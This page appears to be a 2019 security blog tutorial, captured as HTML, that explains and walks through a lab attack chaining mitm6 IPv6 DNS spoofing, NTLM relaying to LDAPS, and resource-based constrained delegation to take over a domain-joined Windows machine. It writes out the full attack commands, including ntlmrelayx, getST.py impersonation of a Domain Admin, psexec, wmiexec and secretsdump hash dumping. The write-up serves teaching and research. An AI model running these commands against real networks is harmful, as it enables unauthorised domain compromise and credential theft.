@@ -1,0 +1,907 @@
+<html lang="en" class="js fontawesome-i2svg-active fontawesome-i2svg-complete"><head>
+    <meta charset="utf-8">
+
+<!-- begin _includes/seo.html --><title>Combining NTLM Relaying and Kerberos delegation - c:\rusher blog</title>
+<meta name="description" content="A computer takeover attack through some funky relaying and abuse of Kerberos.">
+
+
+
+<meta property="og:type" content="article">
+<meta property="og:locale" content="en_US">
+<meta property="og:site_name" content="c:\rusher blog">
+<meta property="og:title" content="Combining NTLM Relaying and Kerberos delegation">
+<meta property="og:url" content="https://chryzsh.github.io/relaying-delegation/">
+
+
+  <meta property="og:description" content="A computer takeover attack through some funky relaying and abuse of Kerberos.">
+
+
+
+  <meta property="og:image" content="https://chryzsh.github.io/assets/img/winlogo.png">
+
+
+
+
+
+  <meta property="article:published_time" content="2019-04-14T16:08:00+00:00">
+
+
+
+
+
+  
+
+  
+
+
+<style type="text/css">svg:not(:root).svg-inline--fa{overflow:visible}.svg-inline--fa{display:inline-block;font-size:inherit;height:1em;overflow:visible;vertical-align:-.125em}.svg-inline--fa.fa-lg{vertical-align:-.225em}.svg-inline--fa.fa-w-1{width:.0625em}.svg-inline--fa.fa-w-2{width:.125em}.svg-inline--fa.fa-w-3{width:.1875em}.svg-inline--fa.fa-w-4{width:.25em}.svg-inline--fa.fa-w-5{width:.3125em}.svg-inline--fa.fa-w-6{width:.375em}.svg-inline--fa.fa-w-7{width:.4375em}.svg-inline--fa.fa-w-8{width:.5em}.svg-inline--fa.fa-w-9{width:.5625em}.svg-inline--fa.fa-w-10{width:.625em}.svg-inline--fa.fa-w-11{width:.6875em}.svg-inline--fa.fa-w-12{width:.75em}.svg-inline--fa.fa-w-13{width:.8125em}.svg-inline--fa.fa-w-14{width:.875em}.svg-inline--fa.fa-w-15{width:.9375em}.svg-inline--fa.fa-w-16{width:1em}.svg-inline--fa.fa-w-17{width:1.0625em}.svg-inline--fa.fa-w-18{width:1.125em}.svg-inline--fa.fa-w-19{width:1.1875em}.svg-inline--fa.fa-w-20{width:1.25em}.svg-inline--fa.fa-pull-left{margin-right:.3em;width:auto}.svg-inline--fa.fa-pull-right{margin-left:.3em;width:auto}.svg-inline--fa.fa-border{height:1.5em}.svg-inline--fa.fa-li{width:2em}.svg-inline--fa.fa-fw{width:1.25em}.fa-layers svg.svg-inline--fa{bottom:0;left:0;margin:auto;position:absolute;right:0;top:0}.fa-layers{display:inline-block;height:1em;position:relative;text-align:center;vertical-align:-.125em;width:1em}.fa-layers svg.svg-inline--fa{-webkit-transform-origin:center center;transform-origin:center center}.fa-layers-counter,.fa-layers-text{display:inline-block;position:absolute;text-align:center}.fa-layers-text{left:50%;top:50%;-webkit-transform:translate(-50%,-50%);transform:translate(-50%,-50%);-webkit-transform-origin:center center;transform-origin:center center}.fa-layers-counter{background-color:#ff253a;border-radius:1em;-webkit-box-sizing:border-box;box-sizing:border-box;color:#fff;height:1.5em;line-height:1;max-width:5em;min-width:1.5em;overflow:hidden;padding:.25em;right:0;text-overflow:ellipsis;top:0;-webkit-transform:scale(.25);transform:scale(.25);-webkit-transform-origin:top right;transform-origin:top right}.fa-layers-bottom-right{bottom:0;right:0;top:auto;-webkit-transform:scale(.25);transform:scale(.25);-webkit-transform-origin:bottom right;transform-origin:bottom right}.fa-layers-bottom-left{bottom:0;left:0;right:auto;top:auto;-webkit-transform:scale(.25);transform:scale(.25);-webkit-transform-origin:bottom left;transform-origin:bottom left}.fa-layers-top-right{right:0;top:0;-webkit-transform:scale(.25);transform:scale(.25);-webkit-transform-origin:top right;transform-origin:top right}.fa-layers-top-left{left:0;right:auto;top:0;-webkit-transform:scale(.25);transform:scale(.25);-webkit-transform-origin:top left;transform-origin:top left}.fa-lg{font-size:1.3333333333em;line-height:.75em;vertical-align:-.0667em}.fa-xs{font-size:.75em}.fa-sm{font-size:.875em}.fa-1x{font-size:1em}.fa-2x{font-size:2em}.fa-3x{font-size:3em}.fa-4x{font-size:4em}.fa-5x{font-size:5em}.fa-6x{font-size:6em}.fa-7x{font-size:7em}.fa-8x{font-size:8em}.fa-9x{font-size:9em}.fa-10x{font-size:10em}.fa-fw{text-align:center;width:1.25em}.fa-ul{list-style-type:none;margin-left:2.5em;padding-left:0}.fa-ul>li{position:relative}.fa-li{left:-2em;position:absolute;text-align:center;width:2em;line-height:inherit}.fa-border{border:solid .08em #eee;border-radius:.1em;padding:.2em .25em .15em}.fa-pull-left{float:left}.fa-pull-right{float:right}.fa.fa-pull-left,.fab.fa-pull-left,.fal.fa-pull-left,.far.fa-pull-left,.fas.fa-pull-left{margin-right:.3em}.fa.fa-pull-right,.fab.fa-pull-right,.fal.fa-pull-right,.far.fa-pull-right,.fas.fa-pull-right{margin-left:.3em}.fa-spin{-webkit-animation:fa-spin 2s infinite linear;animation:fa-spin 2s infinite linear}.fa-pulse{-webkit-animation:fa-spin 1s infinite steps(8);animation:fa-spin 1s infinite steps(8)}@-webkit-keyframes fa-spin{0%{-webkit-transform:rotate(0);transform:rotate(0)}100%{-webkit-transform:rotate(360deg);transform:rotate(360deg)}}@keyframes fa-spin{0%{-webkit-transform:rotate(0);transform:rotate(0)}100%{-webkit-transform:rotate(360deg);transform:rotate(360deg)}}.fa-rotate-90{-webkit-transform:rotate(90deg);transform:rotate(90deg)}.fa-rotate-180{-webkit-transform:rotate(180deg);transform:rotate(180deg)}.fa-rotate-270{-webkit-transform:rotate(270deg);transform:rotate(270deg)}.fa-flip-horizontal{-webkit-transform:scale(-1,1);transform:scale(-1,1)}.fa-flip-vertical{-webkit-transform:scale(1,-1);transform:scale(1,-1)}.fa-flip-both,.fa-flip-horizontal.fa-flip-vertical{-webkit-transform:scale(-1,-1);transform:scale(-1,-1)}:root .fa-flip-both,:root .fa-flip-horizontal,:root .fa-flip-vertical,:root .fa-rotate-180,:root .fa-rotate-270,:root .fa-rotate-90{-webkit-filter:none;filter:none}.fa-stack{display:inline-block;height:2em;position:relative;width:2.5em}.fa-stack-1x,.fa-stack-2x{bottom:0;left:0;margin:auto;position:absolute;right:0;top:0}.svg-inline--fa.fa-stack-1x{height:1em;width:1.25em}.svg-inline--fa.fa-stack-2x{height:2em;width:2.5em}.fa-inverse{color:#fff}.sr-only{border:0;clip:rect(0,0,0,0);height:1px;margin:-1px;overflow:hidden;padding:0;position:absolute;width:1px}.sr-only-focusable:active,.sr-only-focusable:focus{clip:auto;height:auto;margin:0;overflow:visible;position:static;width:auto}</style><link rel="canonical" href="https://chryzsh.github.io/relaying-delegation/">
+
+
+
+
+
+  <script type="text/javascript" async="" src="https://ssl.google-analytics.com/ga.js"></script><script type="application/ld+json">
+    {
+      "@context": "https://schema.org",
+      "@type": "Organization",
+      "url": "https://chryzsh.github.io",
+      "logo": "https://chryzsh.github.io/assets/img/winlogo.png"
+    }
+  </script>
+
+
+
+  <script type="application/ld+json">
+    {
+      "@context": "https://schema.org",
+      "@type": "Person",
+      "name": "Your Name",
+      "url": "https://chryzsh.github.io",
+      "sameAs": null
+    }
+  </script>
+
+
+
+
+
+
+
+<!-- end _includes/seo.html -->
+
+
+<link href="/feed.xml" type="application/atom+xml" rel="alternate" title="c:\rusher blog Feed">
+
+<!-- https://t.co/dKP3o1e -->
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<script>
+  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
+</script>
+
+<!-- For all browsers -->
+<link rel="stylesheet" href="/assets/css/main.css">
+
+<!--[if IE ]>
+  <style>
+    /* old IE unsupported flexbox fixes */
+    .greedy-nav .site-title {
+      padding-right: 3em;
+    }
+    .greedy-nav button {
+      position: absolute;
+      top: 0;
+      right: 0;
+      height: 100%;
+    }
+  </style>
+<![endif]-->
+
+
+
+    
+    <!-- Default head tags -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link rel="stylesheet" href="/assets/main.css">
+    <link rel="alternate" type="application/rss+xml" title="c:\rusher blog" href="/feed.xml">
+  
+    <!-- Favicon head tag -->
+
+
+    <link rel="apple-touch-icon" sizes="180x180" href="https://chryzsh.github.io/assets/favicon/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="https://chryzsh.github.io/assets/favicon/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="https://chryzsh.github.io/assets/favicon/favicon-16x16.png">
+    <link rel="manifest" href="https://chryzsh.github.io/assets/favicon/site.webmanifest">
+    <link rel="mask-icon" href="https://chryzsh.github.io/assets/favicon/safari-pinned-tab.svg">
+    <link rel="shortcut icon" href="https://chryzsh.github.io/assets/favicon/favicon.ico">
+    <meta name="msapplication-TileColor" content="#da532c">
+    <meta name="msapplication-config" content="https://chryzsh.github.io/assets/favicon/browserconfig.xml">
+    <meta name="theme-color" content="#ffffff">
+    
+    
+  <style id="fit-vids-style">.fluid-width-video-wrapper{width:100%;position:relative;padding:0;}.fluid-width-video-wrapper iframe,.fluid-width-video-wrapper object,.fluid-width-video-wrapper embed {position:absolute;top:0;left:0;width:100%;height:100%;}</style></head>
+  
+
+  <body class="layout--single wide" style="margin-bottom: 221.217px;">
+
+    <!--[if lt IE 9]>
+<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
+<![endif]-->
+
+    
+
+<div class="masthead">
+  <div class="masthead__inner-wrap">
+    <div class="masthead__menu">
+      <nav id="site-nav" class="greedy-nav">
+        
+        <a class="site-title" href="/">c:\rusher blog</a>
+        <ul class="visible-links"></ul>
+        
+        <button class="greedy-nav__toggle hidden" type="button" style="" count="0">
+          <span class="visually-hidden">Toggle menu</span>
+          <div class="navicon"></div>
+        </button>
+        <ul class="hidden-links hidden"></ul>
+      </nav>
+    </div>
+  </div>
+</div>
+
+
+    <div class="initial-content">
+      
+
+
+
+<div id="main" role="main">
+  
+  <div class="sidebar sticky">
+  
+
+
+<div itemscope="" itemtype="https://schema.org/Person">
+
+  
+    <div class="author__avatar">
+      
+
+      
+        <img src="/assets/img/winlogo2.png" alt="c:\rusher" itemprop="image">
+      
+    </div>
+  
+
+  <div class="author__content">
+    
+      <h3 class="author__name" itemprop="name">c:\rusher</h3>
+    
+    
+      <p class="author__bio" itemprop="description">
+        I have Trust issues.
+      </p>
+    
+  </div>
+
+  <div class="author__urls-wrapper">
+    <button class="btn btn--inverse">Follow</button>
+    <ul class="author__urls social-icons">
+      
+        <li itemprop="homeLocation" itemscope="" itemtype="https://schema.org/Place">
+          <svg class="svg-inline--fa fa-map-marker-alt fa-w-12 fa-fw" aria-hidden="true" focusable="false" data-prefix="fas" data-icon="map-marker-alt" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 384 512" data-fa-i2svg=""><path fill="currentColor" d="M172.268 501.67C26.97 291.031 0 269.413 0 192 0 85.961 85.961 0 192 0s192 85.961 192 192c0 77.413-26.97 99.031-172.268 309.67-9.535 13.774-29.93 13.773-39.464 0zM192 272c44.183 0 80-35.817 80-80s-35.817-80-80-80-80 35.817-80 80 35.817 80 80 80z"></path></svg><!-- <i class="fas fa-fw fa-map-marker-alt" aria-hidden="true"></i> --> <span itemprop="name">Somewhere in your forest</span>
+        </li>
+      
+
+      
+        
+          
+        
+          
+        
+          
+            <li><a href="https://twitter.com/chryzsh" rel="nofollow noopener noreferrer"><svg class="svg-inline--fa fa-twitter-square fa-w-14 fa-fw" aria-hidden="true" focusable="false" data-prefix="fab" data-icon="twitter-square" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512" data-fa-i2svg=""><path fill="currentColor" d="M400 32H48C21.5 32 0 53.5 0 80v352c0 26.5 21.5 48 48 48h352c26.5 0 48-21.5 48-48V80c0-26.5-21.5-48-48-48zm-48.9 158.8c.2 2.8.2 5.7.2 8.5 0 86.7-66 186.6-186.6 186.6-37.2 0-71.7-10.8-100.7-29.4 5.3.6 10.4.8 15.8.8 30.7 0 58.9-10.4 81.4-28-28.8-.6-53-19.5-61.3-45.5 10.1 1.5 19.2 1.5 29.6-1.2-30-6.1-52.5-32.5-52.5-64.4v-.8c8.7 4.9 18.9 7.9 29.6 8.3a65.447 65.447 0 0 1-29.2-54.6c0-12.2 3.2-23.4 8.9-33.1 32.3 39.8 80.8 65.8 135.2 68.6-9.3-44.5 24-80.6 64-80.6 18.9 0 35.9 7.9 47.9 20.7 14.8-2.8 29-8.3 41.6-15.8-4.9 15.2-15.2 28-28.8 36.1 13.2-1.4 26-5.1 37.8-10.2-8.9 13.1-20.1 24.7-32.9 34z"></path></svg><!-- <i class="fab fa-fw fa-twitter-square" aria-hidden="true"></i> --> Twitter</a></li>
+          
+        
+          
+        
+          
+            <li><a href="https://github.com/chryzsh" rel="nofollow noopener noreferrer"><svg class="svg-inline--fa fa-github fa-w-16 fa-fw" aria-hidden="true" focusable="false" data-prefix="fab" data-icon="github" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512" data-fa-i2svg=""><path fill="currentColor" d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6 0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2z"></path></svg><!-- <i class="fab fa-fw fa-github" aria-hidden="true"></i> --> GitHub</a></li>
+          
+        
+          
+        
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      <!--
+  <li>
+    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer">
+      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
+    </a>
+  </li>
+-->
+    </ul>
+  </div>
+</div>
+
+  
+  </div>
+
+
+  <article class="page" itemscope="" itemtype="https://schema.org/CreativeWork">
+    <meta itemprop="headline" content="Combining NTLM Relaying and Kerberos delegation">
+    <meta itemprop="description" content="A computer takeover attack through some funky relaying and abuse of Kerberos.">
+    <meta itemprop="datePublished" content="April 14, 2019">
+    
+
+    <div class="page__inner-wrap">
+      
+        <header>
+          <h1 id="page-title" class="page__title" itemprop="headline">Combining NTLM Relaying and Kerberos delegation
+</h1>
+          
+            <p class="page__meta"><svg class="svg-inline--fa fa-clock fa-w-16" aria-hidden="true" focusable="false" data-prefix="far" data-icon="clock" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" data-fa-i2svg=""><path fill="currentColor" d="M256 8C119 8 8 119 8 256s111 248 248 248 248-111 248-248S393 8 256 8zm0 448c-110.5 0-200-89.5-200-200S145.5 56 256 56s200 89.5 200 200-89.5 200-200 200zm61.8-104.4l-84.9-61.7c-3.1-2.3-4.9-5.9-4.9-9.7V116c0-6.6 5.4-12 12-12h32c6.6 0 12 5.4 12 12v141.7l66.8 48.6c5.4 3.9 6.5 11.4 2.6 16.8L334.6 349c-3.9 5.3-11.4 6.5-16.8 2.6z"></path></svg><!-- <i class="far fa-clock" aria-hidden="true"></i> --> 
+
+
+
+
+  18 minute read
+</p>
+          
+        </header>
+      
+
+      <section class="page__content" itemprop="text">
+        
+        <p>A computer takeover attack through some funky relaying and abuse of Kerberos.</p>
+
+<p><img src="https://danlebrero.com/images/cerberus.jpg" alt=""></p>
+
+<h1 id="overview">Overview</h1>
+
+<p>I’m a huge fan of <a href="https://dirkjanm.io/">dirkjan</a>’s recent discoveries with Kerberos, and his articles are awesome. It did however take me a while to understand what actually goes on in the Kerberos delegation attack, so I’ve made an attempt to explain the details of it and how to execute the attack. I also have done a few experiments on what to do with it once it has been successfully executed. As this is all based on his article <a href="https://dirkjanm.io/worst-of-both-worlds-ntlm-relaying-and-kerberos-delegation/">The worst of both worlds: Combining NTLM Relaying and Kerberos delegation</a>, I recommend reading that first.</p>
+
+<h2 id="what-do-we-achieve-from-this-attack">What do we achieve from this attack?</h2>
+
+<ul>
+  <li>Remote code execution on a domain joined computer</li>
+  <li>Local privilege escalation on said host, with access as SYSTEM</li>
+  <li>Access to a domain machine account
+    <ul>
+      <li>Can be used for domain enumeration (Bloodhound, PingCastle, Powerview, etc.)</li>
+    </ul>
+  </li>
+</ul>
+
+<h1 id="how-does-it-work">How does it work?</h1>
+
+<p>When Windows configured for DHCP boots, it looks for DHCP configuration, and then proxy configuration using WPAD. That way, when the victim computer boots and starts looking for proxy config, the machine account tries to authenticate to us.</p>
+
+<ol>
+  <li>
+    <p>We set up a man-in-the-middle DHCP server on IPv6 and serve a DNS IPv6 configuration that points to our rogue DNS IPv6 server.</p>
+  </li>
+  <li>
+    <p>When the victim uses WPAD to look for a proxy configuration file over DNS, we let it connect to our fake proxy server and then prompt for authentication using a <code class="language-plaintext highlighter-rouge">407 Authentication Required</code> request.</p>
+  </li>
+  <li>
+    <p>We capture and relay the (encrypted) credentials of the machine account to LDAPS on the domain controller (DC).</p>
+  </li>
+  <li>
+    <p>We ask the DC over LDAPS to create a new machine account. Active Directory allows any user account, including machine accounts to add 10 machine accounts by default.</p>
+  </li>
+  <li>
+    <p>We now have credentials for a machine account. The reason we create a machine account is that we need access to an account with a Service Principal Name (SPN).</p>
+  </li>
+  <li>
+    <p>We now ask the DC to configure resource-based constrained delegation for this new machine account on the victim computer object. For example: the machine account <code class="language-plaintext highlighter-rouge">WS02$</code> sets the <code class="language-plaintext highlighter-rouge">msDS-AllowedToActOnBehalfOfOtherIdentity</code> attribute on the computer object <code class="language-plaintext highlighter-rouge">WS02</code> to allow the newly created machine account to impersonate users on it.</p>
+  </li>
+  <li>
+    <p>We request a service ticket using the machine account that was created, where we impersonate a user that has local admin access to our target computer.</p>
+  </li>
+  <li>
+    <p>We use the service ticket to access the computer with local admin privileges. The ticket with these privileges is only valid on the target box.</p>
+  </li>
+</ol>
+
+<h1 id="prerequisites">Prerequisites</h1>
+
+<ul>
+  <li>Install <a href="https://github.com/SecureAuthCorp/impacket">impacket</a> and <a href="https://github.com/fox-it/mitm6">mitm6</a></li>
+  <li>Install the required kerberos packages
+    <ul>
+      <li><code class="language-plaintext highlighter-rouge">apt install krb5-user cifs-utils</code></li>
+    </ul>
+  </li>
+  <li><code class="language-plaintext highlighter-rouge">pip install service-identity</code></li>
+</ul>
+
+<h1 id="requirements">Requirements</h1>
+
+<ul>
+  <li>A Linux host on the network. The attack is hard to execute without a host we have full control over.</li>
+  <li>Domain users must be allowed to create machine accounts in the domain.</li>
+  <li>Target computer(s) must have proxy configured, with internal IPs set up as exceptions</li>
+  <li>To replicate it in our lab we will need LDAP over TLS (LDAPS). See <a href="https://gist.github.com/magnetikonline/0ccdabfec58eb1929c997d22e7341e45">installation guide</a> for setting up certificates on domain controller.
+    <ul>
+      <li>Active Directory Certificate Services (ADCS) must be running on the DC with a valid certificate installed. This enables LDAP over TLS.</li>
+    </ul>
+  </li>
+  <li>IPv6 must be enabled in the network</li>
+</ul>
+
+<p>We can replicate the attack by rebooting Windows for every try, assuming a lab scenario where we control the target. In a real scenario we would have to force a reboot somehow, or show up early and wait for people to turn on their computers. A disconnect of the network card should supposedly work as well, but this is not entirely consistent in my experience.</p>
+
+<h1 id="setup">Setup</h1>
+
+<h2 id="components-of-the-attack">Components of the attack</h2>
+
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">lab.local</code> - AD Domain Name</li>
+  <li><code class="language-plaintext highlighter-rouge">dc01.lab.local</code> - AD Domain Controller</li>
+  <li><code class="language-plaintext highlighter-rouge">ws02.lab.local</code> - Target machine</li>
+  <li><code class="language-plaintext highlighter-rouge">192.168.0.142</code> - Attacker host IP</li>
+  <li><code class="language-plaintext highlighter-rouge">WS02$</code> - Target machine’s machine account
+    <ul>
+      <li>Dollar sign after the name signifies that it’s a machine account</li>
+    </ul>
+  </li>
+  <li><code class="language-plaintext highlighter-rouge">lkys</code> - Domain Administrator</li>
+</ul>
+
+<h2 id="mitm6">mitm6</h2>
+
+<p>Start up the server, specify hostname we want to target and domain.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mitm6 -hw ws02 -d lab.local --ignore-nofqnd
+</code></pre></div></div>
+
+<p><img src="../assets/img/relaydelegation/2019-04-14-12-43-22.png" alt=""></p>
+
+<h2 id="ntlmrelayx">ntlmrelayx</h2>
+
+<p>Start ntlmrelayx, specify domain controller, delegation attack, disable the SMB server and set the name for a malicious WPAD file that will be generated and served to the target.</p>
+
+<p>Create a machine account is supposedly not allowed over LDAP, it needs LDAP over TLS (LDAPS). More on this later.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ntlmrelayx.py -t ldaps://dc01.lab.local --delegate-access --no-smb-server -wh attacker-wpad
+</code></pre></div></div>
+
+<p><img src="../assets/img/relaydelegation/2019-04-14-12-44-15.png" alt=""></p>
+
+<h1 id="attack">Attack</h1>
+
+<p>The only real way to trigger an IPv6 WPAD request is through a user login after a reboot, or reconnects to the network. Once a user is logged in, things should start happening in mitm6 and ntlmrelayx.</p>
+
+<p>What happens first is that the target computer starts performing name resolution to find a proxy server over IPv6. What we then to is a man in the middle attack for DNS on IPv6, where we say “we have the proxy we are looking for!”.</p>
+
+<p><img src="../assets/img/relaydelegation/2019-04-14-12-58-20.png" alt=""></p>
+
+<p>ntlmrelayx captures the incoming request and serves a proxy configuration which ask the target for authentication. The target promptly answers with the machine account’s NTLMv2 hash (NetNTLMv2). ntlmrelayx then relays the captured credentials to LDAP on the domain controller, uses that to create a new machine account, print the account’s name and password and modifies the delegation rights of it.</p>
+
+<p><em>We make a note of the username and password for later so it doesn’t disappear</em></p>
+
+<p><img src="../assets/img/relaydelegation/2019-04-14-13-31-11.png" alt=""></p>
+
+<p>Once the attack has been performed, the machine account should show up as a computer in the domain</p>
+
+<p><img src="../assets/img/relaydelegation/2019-04-14-13-33-09.png" alt=""></p>
+
+<p>We can see with RSAT that the <code class="language-plaintext highlighter-rouge">LUJCDPUQ$</code> machine account is allowed to delegate on the computer object <code class="language-plaintext highlighter-rouge">WS02</code>. This can be seen in the <code class="language-plaintext highlighter-rouge">PrincipalsAllowedToDelegateToAccount</code> attribute on the computer object. We can use RSAT to query this</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Get-ADComputer WS02 -Properties PrincipalsAllowedToDelegateToAccount
+</code></pre></div></div>
+
+<p><img src="../assets/img/relaydelegation/2019-04-14-14-17-51.png" alt=""></p>
+
+<p>We can check with <a href="https://github.com/Kevin-Robertson/Powermad">Powermad</a> who added the machine account. As we can see, the machine account <code class="language-plaintext highlighter-rouge">WS02$</code> added it. It is also the machine account <code class="language-plaintext highlighter-rouge">WS02$</code> that adds the delegation privilege to the computer object <code class="language-plaintext highlighter-rouge">WS02</code>. I execute the below command from a non-domain joined host so I had to specify domain and a credential.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Get-MachineAccountCreator -Domain lab.local -DomainController dc01.lab.local -Credential lkys
+</code></pre></div></div>
+
+<p><img src="../assets/img/relaydelegation/2019-04-14-14-16-31.png" alt=""></p>
+
+<h2 id="request-kerberos-ticket">Request Kerberos ticket</h2>
+
+<p>We now request a Kerberos service ticket (TGS) for the <code class="language-plaintext highlighter-rouge">cifs</code> SPN  for the machine account we created, using impersonation as a user <code class="language-plaintext highlighter-rouge">lkys</code> that is member of the<code class="language-plaintext highlighter-rouge">Domain Admins</code> group. That user naturally has local administrator access to all computers in the domain. When prompted for password,we input the password that was set for the machine account <code class="language-plaintext highlighter-rouge">LUJCDPUQ$</code> when we performed the relaying attack.</p>
+
+<p><em>Common Internet File System (CIFS) is a network filesystem protocol used for providing shared access to files and printers between machines on the network.</em></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>getST.py -spn cifs/ws02.lab.local lab.local/ULRRDUA\$ -impersonate lkys
+</code></pre></div></div>
+
+<p><img src="../assets/img/relaydelegation/2019-04-14-15-09-39.png" alt=""></p>
+
+<p>Now we should be able to use the <code class="language-plaintext highlighter-rouge">lkys.ccache</code> cached ticket to authenticate to the target machine.</p>
+
+<p>We import the ticket from file into the Kerberos cache on our attacker box.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>export KRB5CCNAME=lkys.ccache
+</code></pre></div></div>
+
+<p><img src="../assets/img/relaydelegation/2019-04-14-15-10-52.png" alt=""></p>
+
+<h2 id="verifying-access">Verifying access</h2>
+
+<p>Before we get into command execution, we verify that we have read access to the c$ share. This is a common way to check if we have administrator privileges on a remote host.</p>
+
+<p>We authenticate to SMB on <code class="language-plaintext highlighter-rouge">WS02</code> with the ticket using <code class="language-plaintext highlighter-rouge">smbclient</code> with the <code class="language-plaintext highlighter-rouge">-k</code> parameter that indicates we want to use a Kerberos ticket and <strong>not</strong> NTLM authentication with username and password.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>smbclient -k //ws02.lab.local/c$
+</code></pre></div></div>
+
+<p><img src="../assets/img/relaydelegation/2019-04-14-15-12-20.png" alt=""></p>
+
+<p>Or with <code class="language-plaintext highlighter-rouge">smbclient.py</code> We don’t need to specify the full SPN, but I do it here to show you how the full SPN looks. You will also see here that it uses the TGS from the cache.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>smbclient.py -k lab.local/lkys@ws02.lab.local -debug -no-pass
+</code></pre></div></div>
+
+<p><img src="../assets/img/relaydelegation/2019-04-14-15-16-28.png" alt=""></p>
+
+<h2 id="command-execution">Command execution</h2>
+
+<p>We can get interactive remote command execution using <code class="language-plaintext highlighter-rouge">psexec.py</code>. Note that we can only get command execution as the SYSTEM user with PSexec and is it starts a service remotely as that user.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>psexec.py -k ws02.lab.local -debug -no-pass
+</code></pre></div></div>
+
+<p><img src="../assets/img/relaydelegation/2019-04-14-15-18-32.png" alt=""></p>
+
+<p>We can also get it with <code class="language-plaintext highlighter-rouge">wmiexec.py</code>. With this, we actually get command execution as the domain admin user <code class="language-plaintext highlighter-rouge">lkys</code>. Note that it has to change the  SPN. More about this in the sections below.</p>
+
+<p><img src="../assets/img/relaydelegation/2019-04-14-15-45-33.png" alt=""></p>
+
+<p>If we want to dump the hashes of the target, we can use <code class="language-plaintext highlighter-rouge">secretsdump.py</code></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>secretsdump.py -k ws02.lab.local -no-pass
+</code></pre></div></div>
+
+<p><img src="../assets/img/relaydelegation/2019-04-14-15-45-07.png" alt=""></p>
+
+<h1 id="further-exploration-of-the-attack">Further exploration of the attack</h1>
+
+<p>Now we have performed the attack and have gained what we want to achieve; full administrator level privileges on a remote host, acquired from nothing but network access. This is where I go past what @dirkjanm detailed in his article and into research of my own. If you want to have a deeper understanding of the attack and what’s possible to do with it, keep reading.</p>
+
+<h2 id="a-quick-look-at-wmi-execution">A quick look at WMI execution</h2>
+
+<p>Let’s take a closer look at what goes on during command execution with <code class="language-plaintext highlighter-rouge">wmiexec.py</code> by turning on the <code class="language-plaintext highlighter-rouge">-debug</code> parameter.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wmiexec.py -k -no-pass -debug ws02.lab.local
+</code></pre></div></div>
+
+<p><img src="../assets/img/relaydelegation/2019-04-14-15-25-28.png" alt=""></p>
+
